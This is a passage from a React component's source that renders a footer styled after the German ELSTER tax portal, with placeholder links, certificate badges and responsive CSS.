                "Nutzen und Vorteile", "MeinELSTER+",
                "Sicherheit", "ElsterSecure",
                "Inhalte in Leichter Sprache", "ELSTER-Unternehmenskonto",
              ].map((l) => (
                <a key={l} href="#" style={{ color: "#fff", textDecoration: "none", fontSize: 14, padding: "4px 0" }}>{l}</a>
              ))}
            </div>
          </div>
          <div>
            <div style={{ fontSize: 20, marginBottom: 20 }}>Zertifikate</div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 16 }} className="elster-certs">
              {[
                { img: bsiAsset.url, text: "ISO 27001 Sicherheit im Verfahren ELSTER" },
                { img: bikAsset.url, text: "Vom BIK geprüfter Webauftritt" },
                { img: llAsset.url, text: "Von capito geprüfte Leichte Sprache" },
              ].map((c) => (
                <div key={c.text} style={{ display: "grid", gridTemplateColumns: "1fr 1fr", alignItems: "stretch", color: "#006d97" }}>
                  <div style={{ background: "#fff", display: "flex", alignItems: "center", justifyContent: "center", padding: 14 }}>
                    <img src={c.img} alt="" style={{ height: 56, width: "auto", maxWidth: "100%" }} />
                  </div>
                  <div style={{ background: "#f2f2f2", display: "flex", alignItems: "center", padding: 14, fontSize: 13, lineHeight: 1.3 }}>
                    <span>{c.text} <ExternalLink size={12} style={{ display: "inline", color: "#006d97", verticalAlign: "middle" }} /></span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div style={{ background: "#2b2b2b", color: "#fff", padding: "14px 24px" }}>
          <div style={{ maxWidth: 1400, margin: "0 auto", display: "flex", flexWrap: "wrap", gap: 20, alignItems: "center", fontSize: 14 }} className="elster-footer-bottom">
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Forum <ExternalLink size={11} style={{ display: "inline" }} /></a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Hilfe, <u>FAQ</u></a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Fragen zu ELSTER</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Kontakt</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>KONSENS <ExternalLink size={11} style={{ display: "inline" }} /></a>
            <span style={{ flex: 1 }} />
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Datenschutz</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Impressum</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Barrierefreiheit</a>
            <img src={sternTransparentAsset.url} alt="" style={{ height: 20, width: "auto" }} />
            <span>ELSTER ®</span>
            <span style={{ opacity: 0.8 }}>{txCode}</span>
          </div>
        </div>
      </footer>

      <style>{`
        @media (min-width: 1024px) {
          .elster-main { position: relative; }
          .elster-main::before,
          .elster-main::after {
            content: "";
            position: absolute;
            left: 16px;
            right: 16px;
            border-top: 1px solid ${BORDER};
            pointer-events: none;
          }
          .elster-main::before { top: 24px; }
          .elster-main::after { bottom: 24px; }
        }
        @media (max-width: 1023px) {
          .elster-main { grid-template-columns: 1fr !important; }
          .elster-content { grid-template-columns: 1fr !important; }
          .elster-info { order: 3; margin-left: 0 !important; margin-top: 16px; }
        }
        @media (max-width: 640px) {
          .elster-footer-grid { grid-template-columns: 1fr !important; }
          .elster-certs { grid-template-columns: 1fr !important; }
          .gf-grid { grid-template-columns: 1fr !important; }
        }
      `}</style>
    </div>
  );
};

export default Elster;
